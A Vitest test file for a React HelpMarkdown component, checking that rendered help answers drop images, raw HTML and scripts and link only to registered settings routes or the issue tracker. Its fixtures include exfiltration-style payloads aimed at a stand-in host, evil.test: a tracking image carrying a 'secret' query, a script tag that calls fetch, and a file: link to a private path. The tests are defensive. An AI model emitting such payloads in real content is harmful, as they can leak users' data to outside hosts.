import { expect, it, vi } from "vite-plus/test";

import { act, render, type Screen } from "../../../test/render";

const state = vi.hoisted(() => ({
  openExternal: vi.fn(async (_url: string) => undefined),
}));
vi.mock(import("../../localApi"), async (original) => ({
  ...(await original()),
  ensureLocalApi: (() => ({ shell: { openExternal: state.openExternal } })) as never,
}));
vi.mock(import("@t3tools/shared/HostProcess"), () => {
  throw new Error("Help rendering must not initialize host process services.");
});

import { HelpMarkdown } from "./HelpMarkdown";
import { HELP_ISSUE_TRACKER_URL } from "./helpLinks";

function setup() {
  state.openExternal.mockClear();
}

const renderAnswer = (content: string) => render(<HelpMarkdown content={content} />);
const hrefs = (screen: Screen) =>
  [...screen.container.querySelectorAll("a")].map((node) => node.getAttribute("href"));
const anchor = (screen: Screen, href: string) =>
  screen.container.querySelector<HTMLAnchorElement>(`a[href="${href}"]`)!;
const location = (screen: Screen) => {
  const { pathname, hash } = screen.router!.state.location;
  return { pathname, hash };
};

it("renders readable answers without loading model images or enabling unexpected links or HTML", async () => {
  setup();
  await using screen = await renderAnswer(
    [
      "Check **Providers** first.",
      "![tracking](https://evil.test/collect?secret=value)",
      '<img src="https://evil.test/html-image"><script>fetch("https://evil.test")</script>',
      "[unexpected](https://evil.test/collect?secret=value)",
      "[payload](/settings/providers?secret=value)",
      "[file](file:///Users/private)",
      "[Providers](/settings/providers)",
      `[Issue tracker](${HELP_ISSUE_TRACKER_URL})`,
    ].join("\n\n"),
  );
  expect(screen.container.textContent).toContain("Check Providers first.");
  expect(screen.container.querySelector("img, script, iframe, video, audio")).toBeNull();
  expect(hrefs(screen)).toEqual(["/settings/providers", HELP_ISSUE_TRACKER_URL]);
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
  await act(async () => anchor(screen, HELP_ISSUE_TRACKER_URL).click());
  expect(state.openExternal).toHaveBeenCalledExactlyOnceWith(HELP_ISSUE_TRACKER_URL);
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
  await act(async () => anchor(screen, "/settings/providers").click());
  await expect.poll(() => location(screen)).toEqual({ pathname: "/settings/providers", hash: "" });
  expect(state.openExternal).toHaveBeenCalledTimes(1);
});

it("navigates to registered settings anchors while keeping rejected destinations readable", async () => {
  setup();
  await using screen = await renderAnswer(
    [
      "[Computer use](/settings/general#computer-use)",
      "[Keep worktrees](/settings/storage#storage-worktrees)",
      "[Wrong route](/settings/providers#computer-use)",
      "[Displaced ID](/settings/storage#storage-worktree-keep-when)",
      "[Unknown route](/settings/not-registered)",
      "[Empty anchor](/settings/providers#)",
    ].join("\n\n"),
  );
  expect(hrefs(screen)).toEqual([
    "/settings/maintenance#computer-use",
    "/settings/worktrees#storage-worktrees",
  ]);
  for (const label of ["Wrong route", "Displaced ID", "Unknown route", "Empty anchor"]) {
    expect(screen.container.textContent).toContain(label);
  }
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
  await act(async () => anchor(screen, "/settings/maintenance#computer-use").click());
  await expect
    .poll(() => location(screen))
    .toEqual({ pathname: "/settings/maintenance", hash: "computer-use" });
  expect(state.openExternal).not.toHaveBeenCalled();
});

it("keeps GFM autolinks as text unless resolveHelpLink allows the destination", async () => {
  setup();
  await using screen = await renderAnswer(
    [
      "Bare addresses stay text: https://evil.test/collect?secret=value, www.evil.test, and attacker@evil.test.",
      `Report it at ${HELP_ISSUE_TRACKER_URL}`,
    ].join("\n\n"),
  );
  expect(hrefs(screen)).toEqual([HELP_ISSUE_TRACKER_URL]);
  for (const address of [
    "https://evil.test/collect?secret=value",
    "www.evil.test",
    "attacker@evil.test",
  ]) {
    expect(screen.container.textContent).toContain(address);
  }
  await act(async () => anchor(screen, HELP_ISSUE_TRACKER_URL).click());
  expect(state.openExternal).toHaveBeenCalledExactlyOnceWith(HELP_ISSUE_TRACKER_URL);
  expect(location(screen)).toEqual({ pathname: "/", hash: "" });
});
